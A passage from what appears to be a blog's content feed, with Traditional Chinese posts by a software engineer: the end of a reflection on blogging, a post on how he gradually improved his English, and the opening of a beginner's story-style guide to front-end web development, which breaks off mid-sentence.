title="寫部落格帶給我的影響"></a>寫部落格帶給我的影響</h3><p>要記住，寫部落格的好處都只是附加價值而已。（題外話，如果這個附加價值能夠強烈到你願意「逼自己」寫部落格，那你要把部落格當工具的話好像也行）</p><p>首先，在求職方面部落格沒有帶給我任何影響。</p><p>為什麼？因為我找第一份工作的時候部落格才開始沒多久，其實有質量的文章很少。接著第二份工作就找到海外來了，我的部落格只有在台灣有人聽過，出了台灣根本沒人知道。</p><p>而且在台灣也不一定有人聽過。不信的話你問同事說：「欸欸，你聽過胡立嗎？或是 Huli，你有看過他的部落格嗎？」，你同事有八成會回答：「沒聽過，那是誰？」</p><p>可是如果你給他看我的部落格，讓他看我有寫過哪些文章，他也有八成的可能性會說：「是他喔，有啊我有看過」。大概就跟歌紅人不紅一樣，我是文紅（也沒多紅）人不紅。</p><p>自從寫的文章越來越多，題材越來越廣以後，三不五時就會有朋友跟我說：「欸，我又搜到你的文章了！」，所以如果你先認識我這個人，就會發現我的文章很容易搜到。可是如果你不認識我而是先看文章，就不會特別去留意這個人，也不會留意到原來看過我的文章。</p><p>而真正感受到的正面影響，大概就是自信以及成就感吧。</p><p>最有成就感的時候就是看到文章底下留言的時候：</p><p>「講得清楚易懂！」、「我看了幾篇文章，就你這篇最好懂！」、「感謝阿，我終於弄懂這個是什麼了！」、「牆都不扶，就服你！」</p><p>我原本一直以為把話說清楚是基本能力，後來才漸漸發現原來不是。每個人都能把話說清楚，可是有些人能比其他人把話說得更清楚。</p><p>還有，我有個小習慣，那就是我會不定期去搜尋我文章的軌跡。意思就是用 Google、噗浪、臉書、推特等等的廣告去搜尋有誰分享了我的文章，也順便看他們對文章的評論。看到有崇拜的前輩分享自己的文章也會特別有成就感，有種受到肯定的感覺。</p><p>而這種正面影響是會帶來正面循環的，意思就是：</p><ol><li>寫了一篇文章</li><li>受到肯定，覺得寫文章好有收穫</li><li>於是更有動力寫下一篇文章（回到 1）</li></ol><p>其實這個正面循環可以套用到任何東西上面，而你一旦進入這個循環久了以後，你寫文章的動力就會越來越大。只是就像硬幣有正反兩面，一旦你得到了負面評價，可能就會越來越不敢寫文章，這是雙面刃。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>寫這篇其實也是為了提醒自己：莫忘初衷。</p><p>儘管寫久了以後關注的人變多了，在看我文章的人也變多了，但都要提醒自己寫文章不是為了要得到什麼利益，而是因為我就是喜歡寫。</p><p>不過我到現在其實也都還是很隨性，我朋友說我產量很多，我就回說：「有靈感的時候我就會寫」，另一句沒說的其實是：「沒靈感的時候我就不寫」，所以你仔細看發文日期就會發現我的發文時間一點規律都沒有。</p><p>有可能一個禮拜三篇，也有可能三個月才一篇。這也呼應到我前面所講的，寫部落格這件事情不用有壓力，你想寫就寫，不想寫就不要寫，很 free 的。</p><p>最近想寫的題材快要寫光了，下一篇不知道是什麼時候了哈哈哈哈哈。</p><p>文末來附一下自己 Medium 的後台數據好了，雖然我也不知道分享這個可以幹嘛（按照瀏覽次數排序）：</p><p><img src="/img/blog-e7a23a74ae2b/1__z__bGgRm9bwO75Z57P9__IeA.png"></p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我是如何緩慢提升英文能力的？</title>
      <link href="/2018/06/12/english-174bd9b7c0ce/"/>
      <url>/2018/06/12/english-174bd9b7c0ce/</url>
      
        <content type="html"><![CDATA[<p>其實我從來沒有計劃要寫這種類型的文章，只是最近有個網友透過 Medium 的 private note 功能問我如何提升英文能力，我就想到說這已經不是第一次有人問過我這個問題了。</p><p>身為一個工程師，Don’t repeat yourself，當越來越多人問你的時候，寫一篇文章就對了，以後就只要丟文章連結就好了。</p><p>自己對自己能力的評鑑會受環境以及自信心影響，例如說某個你覺得英文很強的人，他可能只覺得自己英文還好而已。搞不好也有人覺得我英文不錯，但我覺得還是頗破的。</p><p>因此呢，為了排除這些主觀因素的影響，最客觀合理的方法就是直接附上各種資料，才能讓讀者對你的英文能力有個參考值，知道從成績上看來大概落在哪個位置。例如說有個多益 990 的跟你說他英文很爛，你就知道這個人要嘛就是考試作弊要嘛就是超級缺乏自信心。</p><h3 id="我的學校生活"><a href="#我的學校生活" class="headerlink" title="我的學校生活"></a>我的學校生活</h3><p>我跟多數人一樣，學英文是從國小開始的，就是在學校學的，曾經上過一年安親班，但我完全忘記在教什麼了，英文能力也沒有顯著提升。</p><p>國中的時候不算有補習，因為我補了兩三個月就懶得去了，英文能力在班上算是中上，但一直不覺得自己英文有好到哪裡去。但從小就是個會讀書的學生，基測英文考了滿分或是接近滿分。</p><p>高中唸的是師大附中，因為環境的因素，在前三志願很能體會到自己英文不好（至少比起周遭人）這件事實，學校英文課的難度也比國中增加很多。</p><p>口說無憑，我直接附上我高中成績單佐證：</p><p><img src="/img/english-174bd9b7c0ce/1__GeYlCx__EZ7__vnPv0buLYow.jpeg"></p><p>高一上：60 分<br>高一下：56 分<br>高二上：61 分<br>高二下：65 分</p><p>由此可見，我在附中的英文成績真的是頗爛的，從那時候我就知道這件事了。老師教的那些文法我都沒什麼認真在聽我到現在還是搞不懂各種假設語氣，什麼過去進行式之類的我也還是不懂，總之文法真的是頗爛頗爛。</p><p>現在其實有點小後悔，因為後來才發現那些東西滿實用的，只是以前年少不懂事沒有想得這麼遠。如果再讓我重來一次，我可能還是不會認真學吧，因為人就是學不乖嘛。</p><p>學測的時候英文考了 12 級分，在當年是前標，是前 35%，換算成 PR 就是 64，是個比及格好一點的英文成績。</p><p>指考英文則考了 85 分，以當年成績換算成 PR 是 91，比起學測的時候進步很大了。</p><p>在此分享給大家我認為最實用的第一個英文進步小訣竅：<strong>題海戰術。</strong></p><p>從學測到指考我做的事情就是一直寫題目，而且都寫那種克漏字的選擇題，四選一的那種。</p><p>背後的理由很簡單，你要看得懂英文第一個要看懂的就是單字，如果一句話裡面五個單字你看不懂，那你怎麼會覺得你能夠看懂整句話？可是如果只有一個單字看不懂，還是有機會從上下文裡面推敲出這個字的意思。</p><p>題海戰術真的是簡單實用，就一直不斷寫題目，然後就會看到一大堆新的單字，寫完之後檢討，就會把單字記起來。但你千萬不要傻傻的只把這個當作寫題目，只去查正確答案的那個單字。</p><p>正確的使用方法是：</p><blockquote><p>請把題目裡面以及四個選項出現的單字都去搞懂是什麼意思</p></blockquote><p>我沒有要你背起來，因為就算背起來你也會忘掉，你只要查一下，在考題旁邊畫線然後寫中文就好了。以後你在寫考題的時候，就邊看邊把中文寫在旁邊，不知道的就對答案檢討過後再寫下來。</p><p>那沒有要背單字的話，單字怎麼記得起來呢？</p><p>很簡單阿，出現一次你記不起來，出現五次你總記得起來吧？還是不行的話，出現十次總可以吧？題海戰術的好處就是這樣，常見的單字會一直一直一直重複出現，出現到你都不想看到它了。</p><p>promptly、simultaneously、spontaneous，這三個不知道為什麼在考題裡面超常出現的單字我過了五年還是忘不掉。</p><p>總而言之呢，就是透過一大堆英文選擇題來培養自己的單字量，我真的覺得這招很有用，誠心推薦。如果你有空的話還可以順便留意一下題目裡出現的文法，一舉兩得。</p><h3 id="上了大學之後"><a href="#上了大學之後" class="headerlink" title="上了大學之後"></a>上了大學之後</h3><p>我大學念的是台灣大學，比起師大附中又高了一個等級。相當然爾，身邊同學的英文能力又更進一步了。</p><p>在開學之前，我收到了台大寄給我的一封信：</p><p><img src="/img/english-174bd9b7c0ce/1__ByoLAVpeesuGdHzYKMmIfQ.png"></p><p>就是我的英文成績在大一新生裡是倒數 400 名，所以不用選英文課了，學校自動幫你安排好班級了。有種能力分班的感覺，但只有能力差的要特別分一班，其他都是自由選擇。</p><p>但我那時候不想上英文課，就一怒之下退掉了，後來跑去修德文，只是修了一個學期之後也退掉了。是的，我就是個很喜歡半途而廢的人。</p><p>有了英文必帶的加持之後，系上同學都知道我是英文成績很差的人，尤其是我開頭講的，跟其他同學一比之後英文能力顯得更差了。我們系上課程很多都是要唸英文文本，念得滿吃力的。但幸好後來沒什麼在念書，所以沒有太大的困擾。</p><p>不過由於有加減在讀文本，所以英文閱讀的能力還是 OK 的，只是還是會有單字看不懂，然後文法還是差到爆而已。</p><h3 id="出社會之後"><a href="#出社會之後" class="headerlink" title="出社會之後"></a>出社會之後</h3><p>在開始工作以前，我去了一趟東京。那時候住的是 Airbnb，跟其他房客都只能用英文溝通，那是我人中第一次深刻體會到英文的重要性。回來以後我在我的臉書上面寫下了：</p><blockquote><p>感受最深的大概是英文真的很重要吧，要走出台灣，要跟外國人溝通就是需要英文，這次到日本應該算是我第一次跟別人用英文聊天，用英文跟別人講說我為什麼要來日本玩，用英文跟他們討論前陣子台灣跟這陣子香港發生了什麼事，也感受到了我英文真的滿爛的，沒有辦法很精確的描述出想要講述的事項，這算是一點小遺憾，也沒有辦法開口問他們一些我想知道的問題，因為不知道怎麼問或是他們回答我可能也聽不太懂。</p></blockquote><p>而一年以後，我也寫了一篇叫做「切身之痛」的文章：</p><blockquote><p>「親身經歷」很重要，那是看再多書、知道再多知識都無法帶給你的東西，因為這種體驗只存在於現實生活的互動當中。</p></blockquote><blockquote><p>就像從小到大一直聽到「英文很重要，真的很重要」，但是為什麼很重要？因為以後要跟國外的人溝通，要會講英文；因為會英文才能去外商工作，待遇比較好；因為要與國際接軌。嗯，我知道英文很重要。但沒有切身之痛，我無法感受到英文真的很重要。</p></blockquote><blockquote><p>我第一次感受到英文很重要的時候，不是考高中要考英文的時候，也不是考學測要考英文的時候，更不是考指考要考英文的時候；而是去年我去日本的時候。如同開頭所說的，我用 airbnb 找到了住宿，就是一般的平房然後兩三個房間分租給不同的房客住，或是簡單兩個字描述：短租。那時四五個房客之間都用英文溝通，如果不會英文或是英文不好的話就會溝通困難。我就是溝通困難的那個，基本對話是可以啦，但是要更深一點就不行了，你會很明顯的知道，你沒有辦法像中文那樣完整的表達自己的想法。</p></blockquote><p>所以在那之後，我有一度很想提升自己的英文能力，於是也上網查了一大堆方法。</p><p>我找了一堆的英文 podcast 跟廣播網站，像是 CNN Student News 還有 60 Second Science 之類的。我把這些網站都加入到我的最愛，放到一個「學英文」的書籤裡面，從此以後再也沒有打開過。</p><p>由此可見，對像我這種沒有上進心又懶惰的人來說，一般的學英文方法是行不通的，因為他的前提是你要自己努力。</p><p>對我來說最有效的一個方法，就是找自己喜歡的東西。例如說我喜歡寫程式，所以從那時候就一直維持偶爾看一些英文技術文章的習慣，大多數文章都從 <a href="https://news.ycombinator.com/">Hacker News</a> 上面看來的。這方法滿有用的，至少可以自然而然的就一直看英文文章，看久了你就會慢慢習慣了。</p><p>所以聽說讀寫裡面，讀一直是我表現比較好的科目。</p><p>接著在我工作的第一年，我去考了多益。成績是聽力 425 &#x2F; 閱讀 430，總分 855，離金色證書只有一題的差距，還真是幸運。而準備多益的方法就是買了幾本書然後一直寫多益試題，就這樣。原理跟高中時候考指考差不多，都是靠題海戰術來取勝。</p><p>至於聽力的話，我也曾經想過要「刻意提升」，上面我有講過了可以找一些英文廣播網站，或者也曾想過我要看歐美影集練聽力。</p><p>但我後來發現看歐美影集練聽力這件事情我沒辦法。因為魚與熊掌不可兼得，我如果要練聽力，劇情就會看不懂。如果要看懂劇情，我就沒辦法不看中文字幕。</p><p>後來我選擇了一樣看中文字幕，但差別在：我會多用點心去聽聲音，去聽他們在講什麼，而不是完全專心在劇情上面。我覺得這點其實差滿多的，從那以後我看電影也是，會比較仔細去聽對白，而不是專注在字幕跟劇情上。</p><p>另外一個自然提升的方法是我看了哈佛大學的開放式課程：CS50，因為沒有中文字幕，所以是一堂全英文的課程，而且看一看發現自己好像聽力還 OK！但我覺得是裡面很多專有名詞，然後這又是我擅長的領域。</p><p>這就是第二個小撇步：去找自己領域的英文課程來看！因為教的東西都是你熟悉的或者你根本已經會的，所以就能夠很快上手，又能夠複習所學又能夠學英文，多棒！</p><p>考完多益以後，聽說讀寫之中看起來聽跟讀都還可以，那說跟寫呢？我覺得還是頗爛。說的重點在於膽量，而寫的重點在於文法，這兩者我都沒有。</p><h3 id="前進海外"><a href="#前進海外" class="headerlink" title="前進海外"></a>前進海外</h3><p>工作一年多之後，無意間收到 Garena 新加坡的來信問我有沒有興趣面試，我原本算是委婉拒絕，後來 HR 鼓勵我說：不然先投投看嘛，我就鼓起勇氣投了。</p><p>身為一個本來就想到處跑來跑去的人，出國工作一直是我的選項之一，但那時的我還沒敢想這個。理由很簡單，因為覺得自己英文太爛啊，出國工作的基本門檻就是英文能力，你一個英文爛的人連日常生活都有問題了，何況是工作。</p><p>可是後來我成功來到新加坡了。</p><p>可是能來這裡不是因為我英文比想像中的好，而是因為新加坡的 Garena 沒有那麼要求英文。我面試的時候四次都是中文，只有跟 HR 的書信往返是用英文而已，然後我就錄取了。</p><p>進到公司以後也是，用中文跟英文的比例大概是 9:1，再加上我又很少跟別人閒聊，待了一年覺得英文能力好像也沒什麼成長。不過老實說，在這段期間聽力其實有進步。</p><p>學英文小撇步三：把自己丟到一個全英文的環境。被問路啦，買東西啦，公司開會啦，就算用到英文的機會沒那麼多，但還是有些場合你會被迫用到英文，這個時候聽力跟口說就會進步一點。</p><p>那時候我也意識到了一件事：</p><blockquote><p>你敢開口說就贏一半了。</p></blockquote><p>不過我到現在還是沒有很敢開口就是了。</p><p>如同剛剛提過的，在 Garena 待了一年覺得英文能力沒有顯著成長，於是我就離職了，後來跑到一間全英文環境的公司去，每天都要說英文、聽英文，要用英文跟同事解釋這個東西在幹嘛，以及要聽得懂同事的解釋。久而久之下來，英文程度好像有在慢慢進步。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>總結一下上面提到的三個方法：</p><ol><li>題海戰術幫助你認識單字</li><li>看自己專業相關的英文線上課程</li><li>把自己丟到一個全英文環境</li></ol><p>第一個練你的閱讀跟單字量，第二個練你的聽力，第三個聽說讀寫什麼都練。但要能夠把自己丟到全英文環境，自己的英文能力也要有一定的水準才行。</p><p>身為一個懶惰的人，如果要說我有認真在學英文的話，那就太高估我了。除了指考那一段是真正在念書以外，其他的都是靠著時間緩慢累積起來的。</p><p>至今我依然不覺得我英文好，同事在聊天的時候我還是會聽不懂，開會的時候也沒有完全聽懂過。寫作的時候總覺得字彙用的不對，文法不知道怎麼用。</p><p>那怎麼辦呢？</p><p>不怎麼辦，就順其自然吧。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零基礎的小明要如何成為前端工程師？</title>
      <link href="/2018/06/10/frontend-engineer-guide-297821512f4e/"/>
      <url>/2018/06/10/frontend-engineer-guide-297821512f4e/</url>
      
        <content type="html"><![CDATA[<p>如果你是個毫無基礎又想要轉職成前端工程師的迷惘初學者，你腦中浮現的第一個問題有八成會是這個。接下來你會做什麼？你大概會用：「如何成為前端工程師」、「前端 入門」、「前端 轉職」、「前端 非本科」等等的關鍵字來搜尋，然後呢？</p><p>然後我希望你能搜尋到我這一篇，讓我來好好告訴你。</p><p>有鑒於上一篇（如果你還沒看過的話：<a href="/2018/05/04/introduction-mvc-spa-and-ssr-545c941669e9/">跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR</a>）的反應出乎意料的好，因此這次還是由小明出馬，由一段虛構的故事慢慢帶你看前端工程師到底需要會哪些東西，故事看完了，你也差不多知道你到底該學什麼了。</p><p>這篇文章的目標是你沒什麼程式基礎也能夠看得懂，比上篇的門檻再低一點。故事情節的發展順序<strong>不一定</strong>代表真實世界中這些技術出現的順序，順序的安排只是因為我覺得這樣子能幫助初學者更好理解這些技術到底在幹嘛。</p><p>好，讓我們開始吧！</p><h3 id="在很久很久以前…（真的很久）"><a href="#在很久很久以前…（真的很久）" class="headerlink" title="在很久很久以前…（真的很久）"></a>在很久很久以前…（真的很久）</h3><p>那時候小明 12 歲，正在唸小學六年級。在上電腦課玩著世紀帝國的時候（how do you turn this on?），老師突然宣布學校有舉辦班級網頁設計比賽，優勝者可以獲得十個好寶寶章。</p><p>身為一個從小學二年級就開始用電腦的人，小明自認為對電腦操作都很熟悉，心想網頁應該也不難，就決定接受這個挑戰。並且在回到家之後 ，上了奇摩知識+發問：</p><blockquote><p>[急]請問要怎麼寫網頁？ 求解 20 點</p></blockquote><p>底下熱心的網友們給了他兩個關鍵字：FrontPage 跟 Dreamweaver，並且跟他說寫網頁其實很簡單，這兩個軟體提供了很多現成的元件，你就想成是在打一份 word 文件就好，只是你可以加上按鈕、表單等等只有網頁會出現的東西。你只要用拖拉的方式，就能夠很輕易地寫出一個網頁來。</p><p>就如下圖所示，你可以立刻看到你的網頁長什麼樣子：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__US5sP1rdNfop0FI__fe0Nmw.gif"></p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__VE__5axTcsYE9KzH6VwjYRQ.jpeg"></p><p>雖然搞不太懂是怎樣一回事，但小明試用了一下這兩套軟體，發現寫個網站還真的很容易！就跟編輯文件一樣，你想要編輯什麼文字你就直接改就對了，要圖片的話也可以很輕鬆的直接插入。</p><p>一直到小明長大後才知道，原來這種編輯模式就叫做「所見即所得」，你看到編輯器裡面長什麼樣子，實際上的網頁就會長成那個樣子（英文叫做 WYSIWYG，What You See Is What You Get）。</p><p>經過一番摸索之後，小明完成了班網的雛形：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__dcB84IJpdSUsamiZAkWK__Q.png"></p><p>「才一個下午我就可以做成這樣，再給我三天，我應該可以拿優勝吧」樂觀的小明自覺前途一片光明，想說今天也累了便先去洗洗睡了。</p><p>他不知道的是，坎坷的未來正在等著他。</p><h3 id="與網頁本人的初次見面"><a href="#與網頁本人的初次見面" class="headerlink" title="與網頁本人的初次見面"></a>與網頁本人的初次見面</h3><p>隔天放學回家，小明打開電腦想要繼續做班網，可是卻發現 FrontPage 怎麼樣都打不開，重開機、重新安裝都沒有用，就只差重灌了。可是重灌會把即時通的歷史記錄全部都洗掉，母湯母湯，到時候小美傳給他的訊息就都不見了，這可不行。</p><p>束手無策的小明，看著昨天用 FrontPage 產生出來的 index.html，不知道哪來的靈感，對它點右鍵，選了「以記事本開啟」，看到了驚人的畫面：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__d6VYVnWZz2ypde0MaJsGqw.png"></p><p>「這是什麼碗糕！」整個畫面上，小明只看得懂中文，其他的根本不知道在寫些什麼。</p><p>原本小明想把視窗關掉，可是卻轉念想說再看一眼好了，而這一看卻讓他發現了一些規律：</p><ol><li><code>&lt;xxx&gt;</code>似乎都是成雙成對出現的，有<code>&lt;xxx&gt;</code>就會有<code>&lt;/xxx&gt;</code></li><li>style 看起來好像跟背景顏色之類的樣式有關</li></ol><p>觀察到規律之後，小明心想那不然我來改改看，看會發生什麼事情好了。於是他就把 <code>&lt;li&gt;通訊錄&lt;/li&gt;</code> 複製了幾次並且改成其他文字，也把 body 那邊的 background 換成 #666666。</p><p>接著存檔，不用記事本而是用網頁來打開，小明看到了下面的景象：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__K5eitXHGfdrKCixGQjj0RA.png"></p><p>「哇！居然還真的改了！」</p><p>一直到日後小明去書店翻書才知道，原來網頁本人其實就是那個用記事本打開的文字檔，而 FrontPage 在做的事不過就是自動幫你產生這些文字而已。而那些成雙成對的&lt;&gt;我們叫它標籤，不同標籤有不同的用途。</p><p>舉例來說，<code>&lt;li&gt;</code>就是 list item 的意思，而標籤裡面放的就是你的內容。至於 style 則是人如其名，負責管理所有跟樣式有關的操作，background 就是背景，color 就是文字顏色。</p><p>這些標籤跟內容我們叫它 HTML（HyperText Markup Language），那些樣式叫做 CSS（Cascading Style Sheets），這就是構成網頁最基本的兩大元素。</p><p>知道網頁原來是由文字組成，不一定要用現成軟體才可以寫出來之後，小明便拋棄了 FrontPage，跑到書店買了幾本網頁入門的書，下定決心從基礎學起。</p><p>不到半個月，他就已經可以只靠文字編輯器來寫出整個網頁。</p><h3 id="我也想要華麗酷炫的功能"><a href="#我也想要華麗酷炫的功能" class="headerlink" title="我也想要華麗酷炫的功能"></a>我也想要華麗酷炫的功能</h3><p>得意洋洋的小明覺得同年齡一定沒有人像他這麼認真參加這個比賽，看來要拿到第一名是輕而易舉了。如此天真的小明，有天碰巧看見隔壁班的小華在請教電腦老師一些網頁的問題，便湊上前去看。</p><p>不看還好，一看驚為天人，兩千四百萬人都驚呆了。</p><p>首先呢，網頁上面有一個計數器，可以顯示一共有多少訪客曾經造訪過這個問題。再來，你的滑鼠附近會有一圈文字，滑鼠移到哪裡文字就跑到哪裡，超級酷炫！還有網頁跑馬燈會不斷輪播班級的公告，就跟實體的跑馬燈效果一樣。</p><p>意氣風發的小明在那一刻啞口無言，深深覺得自己只是隻井底之蛙，不知道外面的世界有多大。花了一些時間整了好自己的心態以後，小明鼓起勇氣問了隔壁班的小華：「欸欸，你那些效果怎麼用的，可以教我嗎？」</p><p>『很簡單啦，你去搜尋：網頁建置百寶箱，那裡真的是百寶箱，要什麼有什麼！根本就是網頁設計師的哆拉 A 夢』</p><p>回到家以後小明照著做了，果真發現一片新天地，那裡充滿著各式各樣的酷炫功能跟效果，你只要把一段文字複製貼上到你的網頁就能夠起作用。小明選了幾個自己覺得很帥的效果，改造了一下班網：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__6mf8b__Z0TOzB1fusPgdVGg.gif"></p><p>可是，如果只是複製貼上的話，是贏不過小華的！必須要以這些特效為基礎自己再客製化，才能夠殺出重圍，驚豔到學校的評審老師們。</p><p>秉持著這樣子的決心，小明仔細看了一下貼到網頁的那些文字，希望能發現一些端倪：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__wLC3C7UN4__VLWExhJovmwQ.png"></p><p>雖然看不太懂是在做什麼，但小明心想：「這應該就是寫程式吧」，透過一些程式碼來操控 HTML 上面的元素，產生出會震動的圖片的效果。</p><p>上網查了一些資料之後，小明才發現原來這個程式語言叫做 JavaScript，能夠操縱網頁上面的東西，只要是看得到的地方都可以用它來操作。所以理想上能做出任何你想得到的功能。</p><p>以上面的圖片震動功能來說，就只是用 JavaScript 寫了以下程式碼：</p><ol><li>當滑鼠移上圖片的時候</li><li>開始震動（震動原理：不斷改變它的位置）</li><li>當滑鼠移開的時候，停止震動並恢復位置</li></ol><p>知道原來可以用 JavaScript 做出這麼酷炫的事情之後，沒有理由不把這個學好。於是小明就到書店找了幾本相關的書籍，從最基本的那些變數、迴圈、判斷式開始學，希望有朝一日能夠寫出屬於自己的程式碼。</p><p>過了兩個禮拜，小明順利的實作出以下功能：</p><ol><li>封鎖右鍵（原理：偵測到按下滑鼠右鍵時就刻意不做任何事）</li><li>顯示日曆（原理：靠程式碼抓出現在時間並顯示出來）</li><li>顯示歡迎文字（原理：網站載入完成時就跳出一個視窗）</li></ol><p>而憑藉著這些小明手寫出來的功能，順利獲得了班網評審老師的一致讚賞，使得他拿到了班網比賽的第一名，把十個好寶寶章輕鬆納入口袋。</p><p>原本就不謙虛的小明在奪冠之後變得更加狂妄，在即時通的狀態寫說：</p><blockquote><p>哈！網頁不過就這樣嘛，就是 HTML 做內容，CSS 做樣式，JavaScript 加程式碼，只要會這三個就好，太簡單了吧！</p></blockquote><p>是的，其實網頁一直到今天還是如此，依舊是以這三者為核心在發展。可是當原生的東西跟不上前端的演進的時候，我們就必須先依賴一些第三方的工具，才能幫助我們更有效率。</p><h3 id="於是長大了以後"><a href="#於是長大了以後" class="headerlink" title="於是長大了以後"></a>於是長大了以後</h3><p>在拿到班網比賽冠軍之後，小明就發現自己對網頁設計真的很有興趣，於是回家之後手裡拿的再也不是 GBA，而是 Introduction to Algorithms，噢不對，是「第一次寫網頁就上手」、「100 個酷炫的 JavaScript 網頁特效」等等的相關書籍。</p><p>升上國中之後，他依舊努力不懈，靠著課餘時間進修網頁設計，對網頁三劍客（HTML、CSS 與 JavaScript）的掌握度也愈來愈高，自大的小明想說他應該已經是世界第一等的水準了，是該出去外面的世界闖闖，就跟父母說他想要嘗試看看接案，拜託他們問問看朋友們有沒有適合的案子。</p><p>把案子交給一個國中生跟交給一個專業的工作室，雖然前者的確也有可能很厲害沒錯，但從公司的角度來看，還是會傾向把案子交給後者，畢竟接案不單單只有「寫程式」這件事情，還有開會討論、報價等等的流程。</p><p>可是皇天不負苦心人，得來全不費工夫，終於在國二的時候，小明接到了人生中第一個案子。</p><p>這案子是一個公司官方網站的建置，圖片素材跟設計稿都由他們提供，小明只要負責把網頁寫出來就好，並且用 JavaScript 來實作一點特效。</p><p>小明雖然只是個 junior student，但自認為是 super junior，花了兩個禮拜的時間就把版面切好，帶到公司去跟對方 demo。案主起初相當滿意，但卻問了一個小明從未想過的問題：</p><blockquote><p>你有在其他瀏覽器上面看過這個網站嗎？舊版 IE、FireFox 或是  Safari？</p></blockquote><p>沒有，小明從來沒有考慮到，他甚至連這世界上有這麼多瀏覽器都不太清楚。而案主當場把他自信滿滿的作品用其他瀏覽器打開，第一個跑版、第二個跳出警告、第三個連畫面都跑不出來，直接白畫面顯示 JavaScript Error。</p><p>這件事情對小明的影響很深，很深。</p><p>從那一刻開始，他才知道世界比他想像中的大很多。在自己的電腦上可以跑，不代表在別人的電腦上也可以跑。寫網頁不只是自己可以看就夠了，也要保證其他人看到的能夠跟你一樣。</p><h3 id="站在巨人的肩膀上"><a href="#站在巨人的肩膀上" class="headerlink" title="站在巨人的肩膀上"></a>站在巨人的肩膀上</h3><p>回到家針對不同瀏覽器測試之後，小明發現很多 CSS 跟程式碼都必須對不同的瀏覽器做出調整才行，例如說在 safari 上面，可能要加上特別的 prefix 才能夠正常運行。</p><p>而 JavaScript 也是一樣，不同瀏覽器可能會有不同的 function name，要針對每個瀏覽器寫出不同的程式碼。</p><p>針對 CSS 的問題，小明發現只有幾個屬性要調整而已，很快就調好了，可是對 JavaScript，卻發現這是一件極為麻煩的事情，有太多東西要加了，而且會把程式碼變得非常混亂。</p><p>正在焦頭爛額之際，有些已經在業界工作的網友跟他說：</p><blockquote><p>你可以用 jQuery  啊！</p></blockquote><p>得到了這個關鍵字之後，小明立馬去研究這到底是個什麼樣的玩意兒。噢對了，如果你好奇他怎麼跟這些網友認識的話，他們是在程式設計俱樂部還有藍色小舖認識的。</p><p>研究了兩天之後，小明發現 jQuery 就是俗稱的 Library，可是在這領域不會翻作圖書館，而是翻作「函式庫」，意思就是它提供了很多現成的 function，你只要用就好了，不用知道他到底是怎麼實作的。</p><p>這跟瀏覽器相容性有什麼關係呢？關係可大了，以前你要寫 30 行程式碼去相容不同的瀏覽器，現在你只要用一行程式碼，用 jQuery 提供的 function 就好，底層它都幫你做好相容了。</p><p>除此之外，語法也變得比較簡潔，一些常用的功能它都幫你先寫好了。jQuery 的知名特徵就是 $ 這個符號，把一堆好用的 function 都放在這個裡面。</p><p>下圖是 jQuery 與原生 JavaScript（又稱為 vanilla js）的比較，站在巨人的肩膀上以後，可以少寫很多行程式碼。</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__N0c7nFDM5TXSWtMxIrM__yw.png"></p><p>順利解決了瀏覽器相容性的問題之後，案主也很開心的把這個案子結掉了。擁有了人生中第一筆收入的小明，從此以後開始了他的接案之路。</p><h3 id="Don’t-repeat-yourself"><a href="#Don’t-repeat-yourself" class="headerlink" title="Don’t repeat yourself"></a>Don’t repeat yourself</h3><p>隨著案子越接越多，小明有一個非常困擾的問題，那就是 CSS。你知我知獨眼龍也知，很多案主喜歡把需求改來改去，早上說網站主色是藍色的好，下午說還是綠色吧，到了晚上又問說能不能改成紅色試試看。</p><p>而且不只顏色，可能網頁邊距啦，寬度啦，總之要一直改來改去的實在是很麻煩，而且很多時候還會改錯。</p><p>為什麼會改錯呢？因為可能網頁背景、按鈕、文章背景都是用紅色做為主色，所以最快的方法顯然是把所有的 red 都取代掉。可是有些顏色雖然也是紅色，但不是因為網頁主色是紅色，而是本來就應該是紅色，例如說錯誤提示的文字。這種就必須再改回來，不然會變得很奇怪。</p><p>因此，小明都是這樣改的：尋找、取代，再把改錯的改回來：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__PhYH9QW__dlx3Z1HiBYBA3w.gif"></p><p>在改來改去的過程中，小明想起一句在這領域裡面很有名的一句話：<strong>Don’t repeat yourself</strong>。不要一直做重複的事情，像現在這樣就很不好，永遠要屈就於這種非常不方便的流程。</p><p>有沒有可能把程式的概念引入到 CSS 裡面去呢？例如說變數？這樣我們就能夠用變數來取代寫死的顏色，要改的話也很方便，只要改一個地方就好：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__7gRpfYpdhBvO1eLhK__XwJg.png"></p><p>在業界工作的前輩們聽到小明的想法之後，就跟他說了：</p><blockquote><p>這不就是 CSS preprocessor 嗎？</p></blockquote><p>CSS preprocessor，翻成中文就叫做 CSS 「預處理器」，簡單來說就是你可以先寫一些不是 CSS 的語法，經過這個預處理器之後，就會變成符合標準的 CSS。</p><p>或是說得更白話一點，就是翻譯啦，你先寫中文，經過 Google 翻譯之後翻成日文，然後日本人就看得懂了。差別在於 Google 翻譯可能會翻的不精準，可是 CSS 預處理器能夠翻的超級精準，保證是標準的 CSS。</p><p>有了預處理器之後，你就可以把變數也應用到 CSS 上面，或甚至你要用迴圈或是函式也可以！總之呢，有了預處理器之後，寫 CSS 跟寫程式的感覺變得更相似了，下面是個簡單的範例：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__zzgwIEcNcwEGbMgEc0rZiw.png"></p><p>最常用的預處理器有幾個：SCSS&#x2F;SASS、Less 跟 Stylus，語法都很類似，基本上挑一個學就夠了，要轉去其他的也不難。有了預處理器之後，就能夠更有效率地去寫 